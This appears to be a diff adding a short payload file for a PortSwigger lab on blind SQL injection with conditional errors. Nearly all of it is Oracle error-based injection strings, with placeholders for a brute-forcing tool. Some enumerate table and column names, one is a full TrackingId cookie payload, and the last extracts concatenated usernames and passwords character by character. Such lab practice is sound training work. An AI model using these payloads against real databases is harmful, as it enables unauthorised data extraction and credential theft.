@@ -1,0 +1,10 @@
+# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+error based table_name like USER: and+'a'=(select case when ({BFP}{OPE}ascii(substr((select table_name from all_tables where table_name like 'USER%' and rownum=1),{INC_5},1))) then to_char(1/0) else 'a' end from dual)
+
+
+error based column_name like USER: and+'a'=(select case when ({BFP}{OPE}ascii(substr((select column_name from all_tab_columns where table_name='USERS' and column_name like 'USER%' and rownum=1),{INC_5},1))) then to_char(1/0) else 'a' end from dual)
+
+burp labs payload: TrackingId=DiLPD9XeHye1AMUR'+and+'a'=(select+case+when+({BFP}{OPE}ascii(substr((select+table_name+from+all_tables+where+table_name+like+'%25USER%25'+and+rownum%3d1),{INC_5},1)))+then+to_char(1/0)+else+'a'+end+from+dual)+and+'a'='a;
+
+content: and+'a'=(select case when (1<ascii(substr((select concat(USERNAME,PASSWORD) from USERS where rownum=1),1,1))) then to_char(1/0) else 'a' end from dual)
